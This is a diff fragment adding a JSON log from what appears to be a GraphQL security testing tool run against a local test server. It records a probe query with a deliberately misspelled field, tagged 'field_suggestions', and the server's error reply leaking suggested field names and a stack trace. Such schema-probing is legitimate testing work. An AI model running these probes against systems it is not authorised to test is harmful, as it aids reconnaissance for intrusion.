+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"location-6\") {\n    id\n    nam\n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.009,
+    "timestamp": "2025-10-05T18:01:51.104673Z",
+    "count": 120,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"nam\" on type \"Location\". Did you mean \"name\" or \"lat\"?",
+          "locations": [
+            {
+              "line": 5,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"nam\" on type \"Location\". Did you mean \"name\" or \"lat\"?",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  }
+]
